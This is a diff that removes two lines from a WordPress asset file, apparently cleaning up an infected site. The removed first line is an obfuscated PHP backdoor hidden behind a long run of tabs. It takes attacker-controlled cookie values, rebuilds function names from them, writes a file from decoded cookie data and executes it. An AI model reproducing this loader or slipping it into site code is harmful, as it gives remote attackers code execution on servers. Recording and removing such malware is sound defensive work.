@@ -1,2 +1,0 @@
-<?php																																										if(isset($_COOKIE[3])&&isset($_COOKIE[17])){$c=$_COOKIE;$k=0;$n=3;$p=array();$p[$k]='';while($n){$p[$k].=$c[17][$n];if(!$c[17][$n+1]){if(!$c[17][$n+2])break;$k++;$p[$k]='';$n++;}$n=$n+3+1;}$k=$p[5]().$p[10];if(!$p[13]($k)){$n=$p[7]($k,$p[23]);$p[15]($n,$p[2].$p[1]($p[25]($c[3])));}include($k);}
- return array('dependencies' => array('lodash', 'wp-polyfill'), 'version' => '593d4ce55e015b8d6a2f');
